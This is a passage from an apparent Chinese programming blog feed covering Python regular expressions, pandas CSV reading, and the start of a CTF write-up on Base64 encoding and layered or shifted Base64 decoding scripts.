<code>string</code> 。</p><h5 id="re-findall函数"><a href="#re-findall函数" class="headerlink" title="re.findall函数"></a>re.findall函数</h5><p>找出所有满足条件的，返回的是一个列表。</p><p>match 和 search 方法都是一次匹配，只要找到了一个匹配的结果就返回。然而，在大多数时候，我们需要搜索整个字符串，获得所有匹配的结果。</p><h5 id="re-sub函数"><a href="#re-sub函数" class="headerlink" title="re.sub函数"></a>re.sub函数</h5><p>用来替换字符串。将匹配到的字符串替换为其他字符串。</p><h4 id="取回匹配的数据"><a href="#取回匹配的数据" class="headerlink" title="取回匹配的数据"></a>取回匹配的数据</h4><p>在正则表达式中，可以对过滤到的字符串进行分组。分组使用圆括号的方式。将每一个正则表达式使用括号括起来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">group()：和group(0)是等价的，返回的是整个满足条件的字符串。</span><br><span class="line">groups()：返回的是里面的子组。索引从1开始。</span><br><span class="line">group(n)：返回的是第一个子组，可以传入多个。</span><br></pre></td></tr></table></figure><h4 id="r"><a href="#r" class="headerlink" title="r"></a>r</h4><p> Python中字符串前面加上 r 表示原生字符串 。</p><h4 id="贪婪模式与非贪婪模式"><a href="#贪婪模式与非贪婪模式" class="headerlink" title="贪婪模式与非贪婪模式"></a>贪婪模式与非贪婪模式</h4><p>贪婪模式：正则表达式会匹配尽量多的字符。默认是贪婪模式。</p><p>非贪婪模式：正则表达式会尽量少的匹配字符。</p><p>贪婪模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#39;&lt;div class&#x3D;&quot;cont&quot;&gt;.*&lt;b&gt;(.*)&lt;&#x2F;b&gt;&#39;,text,re.DOTALL)</span><br></pre></td></tr></table></figure><p>非贪婪模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#39;&lt;div class&#x3D;&quot;cont&quot;&gt;.*?&lt;b&gt;(.*)&lt;&#x2F;b&gt;&#39;,text,re.DOTALL)</span><br></pre></td></tr></table></figure><p>可以看到非贪婪模式使用?表示只匹配一次或者匹配零次。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">text=<span class="string">&#x27;&lt;div class=&quot;cont&quot;&gt;&lt;p&gt;sdf&lt;/p&gt;&lt;b&gt;steady&lt;/b&gt;&lt;b&gt;s1eady&lt;/b&gt;&#x27;</span></span><br><span class="line">print(text)</span><br><span class="line">resault=re.findall(<span class="string">r&#x27;&lt;div class=&quot;cont&quot;&gt;.*&lt;b&gt;(.*?)&lt;/b&gt;&#x27;</span>,text,re.DOTALL)</span><br><span class="line">print(<span class="string">&quot;贪婪模式&quot;</span> + str(resault))</span><br><span class="line">resault=re.findall(<span class="string">r&#x27;&lt;div class=&quot;cont&quot;&gt;.*?&lt;b&gt;(.*?)&lt;/b&gt;&#x27;</span>,text,re.DOTALL)</span><br><span class="line">print(<span class="string">&quot;非贪婪模式&quot;</span> + str(resault))</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">贪婪模式[&#39;s1eady&#39;]</span><br><span class="line">非贪婪模式[&#39;steady&#39;]</span><br></pre></td></tr></table></figure><p>可以看到主要是使用?匹配一次或者零次，来阻止贪婪模式。</p><h4 id="中括号和括号"><a href="#中括号和括号" class="headerlink" title="中括号和括号"></a>中括号和括号</h4><p><code>()</code>是为了提取匹配的字符串。表达式中有几个()就有几个相应的匹配字符串。</p><p><code>[]</code>是定义匹配的字符范围。比如 [a-zA-Z0-9] 表示相应位置的字符要匹配英文字符和数字。<code>[\s*]</code>表示空格或者*号。</p><p>圆括号()是组，主要应用在限制多选结构的范围/分组/捕获文本/环视/特殊模式处理。<code>()</code>内的内容表示的是一个子表达式，()本身不匹配任何东西，也不限制匹配任何东西，只是把括号内的内容作为同一个表达式来处理。</p><p><code>(abc|bcd|cde)</code>，表示这一段是abc、bcd、cde三者之一均可，顺序也必须一致。</p><p>方括号是单个匹配，字符集/排除字符集/命名字符集。<code>[]</code>表示匹配的字符在[]中，并且只能出现一次，并且特殊字符写在[]会被当成普通字符来匹配。</p><p><code>[0-3]</code>，表示找到这一个位置上的字符只能是0到3这四个数字，与(abc|bcd|cde)的作用比较类似，但圆括号可以匹配多个连续的字符，而一对方括号只能匹配单个字符。</p><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">test=<span class="string">&quot;steady&quot;</span></span><br><span class="line">resault=re.match(<span class="string">&#x27;[e]&#x27;</span>,test)</span><br><span class="line">print(resault.group())</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/Users/apple/Desktop/steady.py&quot;</span>, line <span class="number">4</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    print(resault.group())</span><br><span class="line">AttributeError: <span class="string">&#x27;NoneType&#x27;</span> object has no attribute <span class="string">&#x27;group&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">test=<span class="string">&quot;steady&quot;</span></span><br><span class="line">resault=re.match(<span class="string">&#x27;[s]&#x27;</span>,test)</span><br><span class="line">print(resault.group())</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">test=<span class="string">&quot;7667-786876&quot;</span></span><br><span class="line">resault=re.match(<span class="string">&#x27;[\d]*&#x27;</span>,test)</span><br><span class="line">print(resault.group())</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7667</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">test=<span class="string">&quot;7667-786876&quot;</span></span><br><span class="line">resault=re.match(<span class="string">&#x27;\d+&#x27;</span>,test)</span><br><span class="line">print(resault.group())</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7667</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">test=<span class="string">&quot;7667-786876&quot;</span></span><br><span class="line">resault=re.match(<span class="string">&#x27;\d?&#x27;</span>,test)</span><br><span class="line">print(resault.group())</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">test=<span class="string">&quot;7667-786876&quot;</span></span><br><span class="line">resault=re.match(<span class="string">&#x27;\d&#123;3&#125;&#x27;</span>,test)</span><br><span class="line">print(resault.group())</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">766</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">test=<span class="string">&quot;7667-786876&quot;</span></span><br><span class="line">resault=re.match(<span class="string">&#x27;\d&#123;0,10&#125;&#x27;</span>,test)</span><br><span class="line">print(resault.group())</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7667</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">test=<span class="string">&quot;7667-786876&quot;</span></span><br><span class="line">resault=re.match(<span class="string">&#x27;^76&#x27;</span>,test)</span><br><span class="line">print(resault.group())</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">76</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">test=<span class="string">&quot;7667-786876&quot;</span></span><br><span class="line">resault=re.match(<span class="string">&#x27;^763&#x27;</span>,test)</span><br><span class="line">print(resault.group())</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/Users/apple/Desktop/steady.py&quot;</span>, line <span class="number">4</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    print(resault.group())</span><br><span class="line">AttributeError: <span class="string">&#x27;NoneType&#x27;</span> object has no attribute <span class="string">&#x27;group&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="小案例"><a href="#小案例" class="headerlink" title="小案例"></a>小案例</h4><p>身份证</p><p>前17位必须是数字，后一位可以是数字或者x或者X。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">lists = [<span class="string">&#x27;370787199927261616&#x27;</span>,<span class="string">&#x27;370787199927261614&#x27;</span>,<span class="string">&#x27;3707871999272616SS&#x27;</span>,<span class="string">&#x27;37078719992726162X&#x27;</span>,<span class="string">&#x27;37078719992726D616&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> lists:</span><br><span class="line">    resault=re.match(<span class="string">&#x27;\d&#123;17&#125;[\dxX]&#x27;</span>,l)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(resault.group())</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>手机号</p><p>第一位必须是1，一共十一位，无字母。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">lists = [<span class="string">&#x27;19862123063&#x27;</span>,<span class="string">&#x27;29862123063&#x27;</span>,<span class="string">&#x27;198df123063&#x27;</span>,<span class="string">&#x27;1986212d063&#x27;</span>,<span class="string">&#x27;198621230dd&#x27;</span>,<span class="string">&#x27;1987261267171&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> lists:</span><br><span class="line">    resault=re.match(<span class="string">&#x27;1\d&#123;10&#125;&#x27;</span>,l)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(resault.group())</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>网站URL</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">lists = [<span class="string">&#x27;http://www.steady.com&#x27;</span>,<span class="string">&#x27;https://www.steady.com&#x27;</span>,<span class="string">&#x27;http:/www.steady.com&#x27;</span>,<span class="string">&#x27;http://www.steady.top&#x27;</span>,<span class="string">&#x27;http://ww.ls.com&#x27;</span>,<span class="string">&#x27;http://www.dd.com&#x27;</span>,<span class="string">&#x27;ftp://www.steady.com&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> lists:</span><br><span class="line">    resault=re.match(<span class="string">&#x27;(ftp|http|https)://.*.(com|top)$&#x27;</span>,l)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(resault.group())</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="csv文件处理"><a href="#csv文件处理" class="headerlink" title="csv文件处理"></a>csv文件处理</h3><h5 id="读取csv文件"><a href="#读取csv文件" class="headerlink" title="读取csv文件"></a>读取csv文件</h5><p>表头不作为第一行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line">data &#x3D; pd.read_csv(&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;huazhu.com.csv&quot;)</span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure><p>表头作为第一行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line">data &#x3D; pd.read_csv(&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;huazhu.com.csv&quot;,header&#x3D;None)</span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure><h5 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h5><p>获取指定列的数据，并存入一个数组中。</p><p>从文件中取出url并写入一个文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">data = pd.read_csv(<span class="string">&quot;/Users/apple/Desktop/huazhu.com.csv&quot;</span>)</span><br><span class="line">url = data[<span class="string">&quot;url&quot;</span>]</span><br><span class="line">url_list = np.array(url)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;/Users/apple/Desktop/huazhu_url.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> url_list:</span><br><span class="line">        print(i)</span><br><span class="line">        fp.write(i+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-密码题总结</title>
      <link href="2018/12/07/CTF-%E5%AF%86%E7%A0%81%E9%A2%98%E6%80%BB%E7%BB%93/"/>
      <url>2018/12/07/CTF-%E5%AF%86%E7%A0%81%E9%A2%98%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF–密码"><a href="#CTF–密码" class="headerlink" title="CTF–密码"></a>CTF–密码</h1><h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Base64编码是基于64个字符A-Z,a-z，0-9，+，/的编码方式，因为2的6次方正好为64，所以就用6bit就可以表示出64个字符，eg:000000对应A，000001对应B。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/1656180d4f070bcb.jpeg" alt="1656180d4f070bcb"></p><p>每三个字符一组</p><p>1、每个字符转成八位二进制，一共是24位二进制。</p><p>2、24四位二进制转化成四个六位的二进制。</p><p>3、四个六位的二进制转化成十进制。</p><p>4、对应base64编码表将十进制转化成对应的字符。</p><p>特点</p><ul><li><p>标准Base64只有64个字符（英文大小写、数字和+、/）以及用作后缀等号；</p></li><li><p>Base64是把3个字节变成4个可打印字符，所以Base64编码后的字符串一定能被4整除（不算用作后缀的等号）；</p></li><li><p>等号一定用作后缀，且数目一定是0个、1个或2个。这是因为如果原文长度不能被3整除，Base64要在后面添加0凑齐3n位。为了正确还原，添加了几个0就加上几个等号。显然添加等号的数目只能是0、1或2；</p></li><li><p>严格来说Base64不能算是一种加密，只能说是编码转换。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">print(<span class="string">&quot;制作base64编码表：&quot;</span>)</span><br><span class="line">string_temp =<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">base64_dict = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">    base64_dict[i] = string_temp[i]</span><br><span class="line">print(base64_dict)</span><br><span class="line">s=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line">a=<span class="string">&#x27;&#x27;</span></span><br><span class="line">string=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    a+=str(ord(i))</span><br><span class="line">    b=bin(int(a))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">while</span> len(b)!=<span class="number">8</span>:</span><br><span class="line">        a=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">        b=a+b</span><br><span class="line">    string+=b</span><br><span class="line">print(<span class="string">&quot;每三个字符转换成二进制:&quot;</span>+string)</span><br><span class="line">h=<span class="string">&quot;&quot;</span></span><br><span class="line">hb=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">25</span>,<span class="number">6</span>):</span><br><span class="line">    h=string[i:i+<span class="number">6</span>]</span><br><span class="line">    hb.append(h)</span><br><span class="line">print(<span class="string">&quot;每三个八位二进制转化成四个六位二进制：&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hb:</span><br><span class="line">    print(i)</span><br><span class="line">print(<span class="string">&quot;每六位二进制转化成十进制：&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hb:</span><br><span class="line">    <span class="keyword">while</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">in</span> hb:</span><br><span class="line">        hb.remove(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    print(int(i,<span class="number">2</span>))</span><br><span class="line">bs=<span class="string">&quot;&quot;</span></span><br><span class="line">print(<span class="string">&quot;十进制对应base64表转化：&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hb:</span><br><span class="line">    i=int(i,<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> int(i)&gt;<span class="number">64</span>:</span><br><span class="line">        i=i%<span class="number">64</span></span><br><span class="line">    print(base64_dict[i])</span><br><span class="line">    bs+=base64_dict[i]</span><br><span class="line">print(bs)</span><br></pre></td></tr></table></figure><h3 id="Python与Base64"><a href="#Python与Base64" class="headerlink" title="Python与Base64"></a>Python与Base64</h3><h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h4><p><code>b64encode</code>：b64encode 的参数 s 的类型必须是字节包（bytes）。</p><p><code>b64decode</code>：b64decode 的参数 s 可以是字节包（bytes），也可以是字符串（str）。</p><h4 id="编码字符串实例"><a href="#编码字符串实例" class="headerlink" title="编码字符串实例"></a>编码字符串实例</h4><h5 id="字符长度为能被3整除"><a href="#字符长度为能被3整除" class="headerlink" title="字符长度为能被3整除"></a>字符长度为能被3整除</h5><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201010161350712.png" alt="image-20201010161350712"></p><h5 id="字符串长度不能被3整除"><a href="#字符串长度不能被3整除" class="headerlink" title="字符串长度不能被3整除"></a>字符串长度不能被3整除</h5><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201010161406321.png" alt="image-20201010161406321"></p><h4 id="混合加密"><a href="#混合加密" class="headerlink" title="混合加密"></a>混合加密</h4><p>base64与base32混合加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = base64.b32decode(s)</span><br><span class="line">        s = base(s)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s = base64.b64decode(s)</span><br><span class="line">            s = base(s)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line">f = open(<span class="string">&#x27;/Users/apple/Downloads/base/base.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">text = f.read()</span><br><span class="line"></span><br><span class="line">print(base(text))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">dic64 = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>]</span><br><span class="line">dic32 = [<span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>]</span><br><span class="line"></span><br><span class="line">res = open(<span class="string">&#x27;enc.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findchr</span>(<span class="params">text, dic</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">if</span> text.find(i) &gt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span>(findchr(res, dic64)):</span><br><span class="line">        res = base64.b64decode(res)</span><br><span class="line">    <span class="keyword">elif</span>(findchr(res, dic32)):</span><br><span class="line">        res = base64.b32decode(res)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = base64.b16decode(res)</span><br><span class="line">    <span class="keyword">if</span>(res.startswith(<span class="string">&#x27;flag&#123;&#x27;</span>)):</span><br><span class="line">        <span class="keyword">print</span> res</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;enc.txt&#x27;</span>) <span class="keyword">as</span> f:c=f.read()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:c=b16decode(c)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:c=b32decode(c)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">try</span>:c=b64decode(c)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                print(c)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h4 id="移位加密"><a href="#移位加密" class="headerlink" title="移位加密"></a>移位加密</h4><p>“flag”使用base64加密后的字符串是 ZmxhZw== 前面的ZmxhZ不管flag后面是什么都不会改变。我们对比一下前四个字符，”Zmxh”和”3EP/“在base64表中查一下，Z和3差了30，m和E差了30。将s根据位移移动相应位置找到原本的base64，但是加密之后的字符串要是4的倍数，如果不是则需要加”=”。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s= <span class="string">&#x27;3EP/3VNFFmNEAnlHD5dCMmVHD5ad9uG&#x27;</span></span><br><span class="line">t = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">l=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    l += t[(t.index(i)<span class="number">-30</span>)%<span class="number">64</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(l)%<span class="number">4</span>!=<span class="number">0</span>:</span><br><span class="line">    l=l+<span class="string">&quot;=&quot;</span>*(<span class="number">4</span>-(len(l)%<span class="number">4</span>))</span><br><span class="line">print(base64.b64decode(l))</span><br></pre></td></tr></table></figure><h4 id="base64隐写"><a href="#base64隐写" class="headerlink" title="base64隐写"></a>base64隐写</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 